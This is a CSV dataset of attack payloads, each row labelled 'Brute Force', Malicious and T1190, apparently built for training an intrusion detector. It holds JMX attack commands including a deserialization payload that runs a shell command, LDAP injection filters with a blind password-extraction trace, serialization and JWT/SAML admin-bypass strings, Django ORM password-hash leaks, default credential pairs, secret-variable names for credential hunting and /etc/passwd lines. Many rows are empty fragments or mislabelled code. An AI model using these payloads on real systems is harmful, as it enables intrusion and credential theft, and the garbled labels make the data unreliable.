Payload,Signature,AttackType,Severity,MITRE,Label,Description
"self.password = ""anonymous""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
$admin = true;,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
$admin = false;,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
a:2:{s:8:""""username"""";b:1;s:8:""""password"""";b:1;}""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"a:2:{s:10:""admin_hash"";N;s:4:""hmac"";R:2;}",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 """"touch /tmp/xxx""""""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"* Bruteforce a password protected JMX service: """,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DOCKER_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SURGE_LOGIN=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
CF_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
FTP_LOGIN=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
CI_DEPLOY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
OS_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SONATYPE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
tester_keys_password=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
PYPI_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
sonatypePassword=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
OCTEST_APP_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DATABASE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
dockerhubPassword=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ANSIBLE_VAULT_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
IJ_REPO_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ORG_GRADLE_PROJECT_SONATYPE_NEXUS_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
TWINE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
OSSRH_JIRA_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
EXP_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ALGOLIA_ADMIN_KEY_2=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ALGOLIA_ADMIN_KEY_1=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ENCRYPTION_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
UNITY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SONATYPE_NEXUS_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DOCKER_HUB_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
OSSRH_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
env.SONATYPE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SALESFORCE_BULK_TEST_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
CLOUDANT_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
HUB_DXIA2_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
GITHUB_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DOCKERHUB_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
zenSonatypePassword=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SOCRATA_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
BX_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
END_USER_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SONATYPE_TOKEN_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
BINTRAY_GPG_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
MAGENTO_AUTH_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DEPLOY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DROPLET_TRAVIS_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
--password=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
V_SFDC_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ALGOLIA_ADMIN_KEY_MCM=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
clojars_password=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
MAGENTO_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SNOOWRAP_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
NEXUS_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
LOTTIE_UPLOAD_CERT_KEY_STORE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
LOTTIE_UPLOAD_CERT_KEY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
GRADLE_SIGNING_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WPORG_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
password=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
OBJECT_STORAGE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
CERTIFICATE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WATSON_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WATSON_DEVICE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WINCERT_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
FTP_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
MYSQL_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
KAFKA_ADMIN_URL=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
PRIVATE_SIGNING_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
BLUEMIX_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
passwordTravis=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_FB_PASSWORD_3=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_FB_PASSWORD_2=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_FB_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_BASIC_PASSWORD_5=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_BASIC_PASSWORD_4=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_BASIC_PASSWORD_3=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_BASIC_PASSWORD_2=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WIDGET_BASIC_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
ORG_PROJECT_GRADLE_SONATYPE_NEXUS_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
CONVERSATION_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
OCTEST_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WPT_DB_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SQUARE_READER_SDK_REPOSITORY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
APPLE_ID_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SIGNING_KEY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
LEKTOR_DEPLOY_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
MH_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
-Dsonar.login=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
FILE_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
PLUGIN_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
NPM_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
nexusPassword=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
WATSON_CONVERSATION_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
SOUNDCLOUD_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
GCR_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
YANGSHUN_GH_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
PROD_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
DB_PASSWORD=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
&password=,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
pass  = password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
user  = admin)(!(&(1=0,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
query = (&(uid=admin)(!(&(1=0)(userPassword=q)))),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=*))    : OK,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=A*))   : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=B*))   : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=M*))   : OK,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MA*))  : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MB*))  : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MY*))  : OK,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MYA*)) : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MYB*)) : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MYC*)) : KO,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MYK*)) : OK,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
(&(sn=administrator)(password=MYKE)) : OK,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
userPassword,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
userPassword:2.5.13.18:=\xx (\xx is a byte),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
userPassword:2.5.13.18:=\xx\xx,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
userPassword:2.5.13.18:=\xx\xx\xx,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
root:password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"Can be used in an injection like """,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
userPassword,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
""sub"""":""""1234567890""""",",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
""admin"""":true""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"{""login"":""admin""}.",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
> admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
[1] sub = 1234567890,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
[2] role = admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"{""login"":""admin""}.",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Medium,T1190,Malicious,Brute Force payload from comprehensive dataset
./display_mt_rand.php 12345678 123,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*)((|userpassword=*),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*)((|userPassword=*),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*)((|userpassword=*),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*)((|userPassword=*),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin*)((|userpassword=*),Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
""password"""": """"unsafe_password""""",",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
""isAdmin"""": true""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
password,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
isAdmin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
isAdmin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
""username"""": """"admin""""",",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
""password__startswith"""": """"p""""""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"""created_by__user__password__contains"": ""p""",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"{""created_by__user__password__regex"": ""^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$""}",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"{""created_by__user__password__regex"": ""^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$""}",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
--chars '0123456789abcdef' \,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"""password"": true",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
guest:guest,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin:admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
sa:sa,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
root:root,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin:admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin:password123,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
* Finally," leak their password hash: """,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
admin:admin123,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
test:test,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
"<saml2:NameID Format=""urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified"">admin</saml2:NameID>",Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
<saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
NameID=admin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
bin:x:1:1:bin:/bin:/sbin/nologin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
daemon:x:2:2:daemon:/sbin:/sbin/nologin,Brute Force,Brute Force,Low,T1190,Malicious,Brute Force payload from comprehensive dataset
